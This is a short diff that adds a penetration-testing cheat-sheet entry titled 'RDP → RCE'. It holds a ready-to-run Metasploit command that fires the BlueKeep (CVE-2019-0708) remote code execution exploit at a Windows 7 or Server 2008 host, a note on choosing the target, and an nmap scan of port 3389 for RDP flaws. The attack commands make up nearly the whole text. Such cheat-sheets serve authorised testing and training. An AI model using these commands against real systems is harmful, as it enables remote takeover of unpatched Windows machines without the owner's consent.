@@ -1,0 +1,7 @@
+RDP → RCE
+bash# BlueKeep (CVE-2019-0708) - Win7/Server2008
+msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS target; set TARGET 2; run"
+# TARGET 2 = win7 x64, check options for your target version
+
+# Check first
+nmap --script rdp-vuln-ms12-020 -p3389 target
